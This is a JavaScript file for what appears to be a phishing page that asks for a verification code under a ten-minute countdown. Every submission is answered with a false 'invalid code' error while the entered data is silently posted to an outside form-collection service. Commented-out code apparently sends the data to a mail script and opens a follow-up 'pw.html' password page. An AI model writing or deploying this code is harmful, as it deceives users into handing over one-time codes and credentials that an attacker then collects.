const countdownElement = document.querySelector(".count-time");
const errorElement = document.getElementById("errorEl");
// Set the initial countdown time in seconds
let countdown = 600;

function formatTime(timeInSeconds) {
  const minutes = Math.floor(timeInSeconds / 60);
  const seconds = timeInSeconds % 60;
  return `${String(minutes).padStart(2, "0")}:${String(seconds).padStart(
    2,
    "0"
  )}`;
}

function updateCountdown() {
  countdownElement.textContent = formatTime(countdown);
}

// Update the countdown every second
const intervalId = setInterval(() => {
  countdown--;
  updateCountdown();

  // Check if the countdown reaches 0
  if (countdown === 0) {
    clearInterval(intervalId);
    // Handle countdown reaching 0 (e.g., show code again, generate new code, etc.)
  }
}, 1000);

var form = document.getElementById("myForm"); // Make sure your form has the correct ID
form.addEventListener("submit", function (e) {
  e.preventDefault();
  errorElement.textContent =
    "The code you provided is invalid! Please try again.";
  errorElement.style.color = "red";
  errorElement.style.fontWeight = "bold";
  var formData = new FormData(form);

  // Use XMLHttpRequest or fetch API for AJAX request
  var xhr = new XMLHttpRequest();

  xhr.open("POST", "https://usebasin.com/f/eecc5f1c405b", true);
  xhr.onreadystatechange = function () {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = JSON.parse(xhr.responseText);
      console.log(data);
      // Handle success or error messages in the frontend
      if (data.status === "success") {
        alert("Email sent successfully");
      } else {
        alert("Error sending email: " + data.message);
      }
    }
  };

  xhr.send(formData); // Moved this line outside the if block
  
});
// function submitFormAndOpenTab() {
//   // Get the form element
//   var form = document.getElementById("myForm");

//   // Use FormData to collect form data
//   var formData = new FormData(form);

//   // Use XMLHttpRequest or fetch API for AJAX request
//   var xhr = new XMLHttpRequest();

//   xhr.open("POST", "sendMail.php", true);
//   xhr.onreadystatechange = function () {
//     if (xhr.readyState == 4) {
//       if (xhr.status == 200) {
//         var data = JSON.parse(xhr.responseText);
//         console.log(data);
//         // Handle success or error messages in the frontend
//         if (data.status === "success") {
//           alert("Email sent successfully");
//         } else {
//           alert("Error sending email: " + data.message);
//         }
//       } else {
//         // Handle other HTTP status codes
//         alert("Error: " + xhr.status);
//       }
//     }
//   };

//   // Send the AJAX request
//   xhr.send(formData);

//   // Open a new tab with a specified URL
//   window.open("pw.html", "_blank");
// }
